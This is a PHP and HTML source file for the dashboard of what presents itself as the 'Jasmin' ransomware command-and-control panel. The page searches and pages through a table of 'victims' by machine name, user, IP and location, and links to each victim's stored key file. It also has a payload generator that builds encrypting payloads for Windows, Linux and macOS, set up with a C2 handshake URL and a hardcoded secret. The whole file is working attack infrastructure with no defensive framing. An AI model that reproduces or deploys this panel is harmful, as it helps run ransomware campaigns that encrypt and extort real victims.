<?php
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();
include __DIR__ . '/database/db_conection.php';

$records_per_page = 10;
$pageno = max(1, intval($_GET['pageno'] ?? 1));
$search = trim($_GET['search'] ?? '');
$offset = ($pageno - 1) * $records_per_page;

if ($search !== '') {
    $like = '%' . $search . '%';
    $count_stmt = $pdo->prepare('SELECT COUNT(*) FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6');
    $count_stmt->execute([':s1'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like,':s5'=>$like,':s6'=>$like]);
    $total_rows = (int)$count_stmt->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6 ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':s1',$like);$data_stmt->bindValue(':s2',$like);$data_stmt->bindValue(':s3',$like);
    $data_stmt->bindValue(':s4',$like);$data_stmt->bindValue(':s5',$like);$data_stmt->bindValue(':s6',$like);
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
} else {
    $total_rows = (int)$pdo->query('SELECT COUNT(*) FROM victims')->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
}
$total_pages = max(1,(int)ceil($total_rows/$records_per_page));
if ($pageno > $total_pages) $pageno = $total_pages;
$rows = $data_stmt->fetchAll();
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
$csrf = csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Jasmin C2</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="stylesheet" href="./assets/css/dashboard.css">
</head>
<body>
<nav class="sidebar" id="sidebar">
  <div class="sidebar-head"><i class="fas fa-skull-crossbones"></i><span>JASMIN</span></div>
  <a href="dashboard.php" class="nav-item active"><i class="fas fa-chart-pie"></i><span>Dashboard</span></a>
  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>Payload Gen</span></a>
  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>Victims</span></a>
  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>Updates</span></a>
  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>Decrypt</span></a>
  <div class="sidebar-foot">
    <span class="user-badge"><i class="fas fa-user-shield"></i> <?=h($_SESSION['username'])?></span>
    <a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a>
  </div>
</nav>
<button class="hamburger" id="ham" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>

<main class="content">
<!-- Stats -->
<section class="stats-row">
  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num"><?=$total_rows?></span><label>Infected</label></div></div>
  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num"><?=$total_pages?></span><label>Pages</label></div></div>
  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>Platforms</label></div></div>
</section>

<!-- Payload Generator -->
<section class="panel" id="panel-gen">
<h2><i class="fas fa-virus"></i> Payload Generator</h2>
<div class="gen-grid">
  <div class="gen-card" data-platform="win">
    <i class="fab fa-windows"></i><h3>Windows</h3><p>C# / .NET — AES+RSA</p>
    <button class="btn btn-red" onclick="genPayload('win')"><i class="fas fa-download"></i> Generate</button>
  </div>
  <div class="gen-card" data-platform="linux">
    <i class="fab fa-linux"></i><h3>Linux</h3><p>Python3 — AES+RSA</p>
    <button class="btn btn-red" onclick="genPayload('linux')"><i class="fas fa-download"></i> Generate</button>
  </div>
  <div class="gen-card" data-platform="macos">
    <i class="fab fa-apple"></i><h3>macOS</h3><p>Python3 — AES+RSA</p>
    <button class="btn btn-red" onclick="genPayload('macos')"><i class="fas fa-download"></i> Generate</button>
  </div>
</div>
<div class="gen-opts">
  <div class="field"><label>C2 URL</label><input type="text" id="c2url" value="<?=h($GLOBALS['_ENV']['DB_HOST'] ?? 'http://127.0.0.1')?>/handshake.php" placeholder="http://yourserver/handshake.php"></div>
  <div class="field"><label>Handshake Secret</label><input type="text" id="gensecret" value="jasmin@123"></div>
</div>
<div id="gen-result" class="gen-result"></div>
</section>

<!-- Victims -->
<section class="panel" id="panel-victims">
<h2><i class="fas fa-desktop"></i> Victims</h2>
<form action="dashboard.php" method="get" class="search-form">
  <input type="text" name="search" placeholder="Search name, IP, OS, location..." value="<?=h($search)?>">
  <button type="submit"><i class="fas fa-search"></i></button>
</form>
<div class="table-wrap"><table>
<thead><tr><th>#</th><th>Machine</th><th>User</th><th>OS</th><th>IP</th><th>Location</th><th>Date</th><th>Time</th><th>Key</th></tr></thead>
<tbody>
<?php if(empty($rows)):?>
<tr><td colspan="9" class="empty">No victims found.</td></tr>
<?php else: foreach($rows as $i=>$row):
  $sm=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['machine_name']);
  $su=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['computer_user']);
  $ss=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['systemid']);
  $nt=date("H-i-s",strtotime($row['time']));
  $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
?>
<tr>
  <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
  <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
  <td><?=h($row['ip'])?></td><td><?=h($row['location'])?></td>
  <td><?=h($row['date'])?></td><td><?=h($row['time'])?></td>
  <td><?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm"><i class="fas fa-key"></i></a><?php else:?><span class="muted">—</span><?php endif;?></td>
</tr>
<?php endforeach;endif;?>
</tbody></table></div>
<?php if($total_pages>1):?>
<nav class="pagination">
  <a href="?search=<?=urlencode($search)?>&pageno=1" <?=$pageno<=1?'class="disabled"':''?>>&laquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=max(1,$pageno-1)?>" <?=$pageno<=1?'class="disabled"':''?>>&lsaquo;</a>
  <?php $s2=max(1,$pageno-3);$e2=min($total_pages,$pageno+3);for($p=$s2;$p<=$e2;$p++):?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$p?>" <?=$p===$pageno?'class="active"':''?>><?=$p?></a>
  <?php endfor;?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=min($total_pages,$pageno+1)?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&rsaquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$total_pages?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&raquo;</a>
</nav>
<?php endif;?>
</section>
</main>

<!-- Update Panel (hidden by default) -->
<?php include __DIR__ . '/includes/decrypt_panel.html'; ?>
<script>
// inject update panel into main before script
(function(){
  var main=document.querySelector('.content');
  var sec=document.createElement('section');
  sec.className='panel';sec.id='panel-update';sec.style.display='none';
  sec.innerHTML='<h2><i class="fas fa-cloud-download-alt"></i> 检查更新</h2>'
    +'<p style="color:#94a3b8;margin-bottom:16px">当前版本: <b style="color:#4dc3fa">1.0.0</b></p>'
    +'<button class="btn btn-red" onclick="checkUpdate()"><i class="fas fa-sync-alt"></i> 检查更新</button>'
    +'<div id="update-result" style="margin-top:16px"></div>';
  main.appendChild(sec);
})();

function checkUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
  fetch('update.php?action=check').then(x=>x.json()).then(d=>{
    if(!d.ok){r.innerHTML='<div class="gen-err">'+d.msg+'</div>';return;}
    if(d.update){
      var info=d.latest?('最新版本: <b>'+d.latest+'</b>'):('最新提交: <b>'+d.latest_commit+'</b> — '+d.message);
      r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 有新版本可用<br>'+info
        +'<br><br><a href="https://github.com/2016xyz/Jasmin-Ransomware-Private" target="_blank" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-download"></i> 前往下载</a></div>';
    }else{
      r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 ('+d.current+')</div>';
    }
  }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
}

function showDT(t){
  document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
  document.querySelectorAll('.dt-btn').forEach(b=>b.classList.remove('active'));
  var el=document.getElementById('dt-'+t);if(el)el.style.display='block';
  event.target.classList.add('active');
}

function showTab(t){
  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
  var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  event.target.closest('.nav-item').classList.add('active');
}
function genPayload(p){
  var c2=document.getElementById('c2url').value;
  var sec=document.getElementById('gensecret').value;
  var res=document.getElementById('gen-result');
  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> Generating '+p+' payload...</span>';
  var fd=new FormData();
  fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);fd.append('csrf_token','<?=$csrf?>');
  fetch('generate.php',{method:'POST',body:fd})
  .then(r=>r.json()).then(d=>{
    if(d.ok){
      res.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+d.platform+'</b> payload ready: <a href="payloads/'+d.file+'" download>'+d.file+'</a> ('+d.size+' bytes)</div>';
    }else{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> Error: '+e+'</div>';});
}
</script>
</body>
</html>
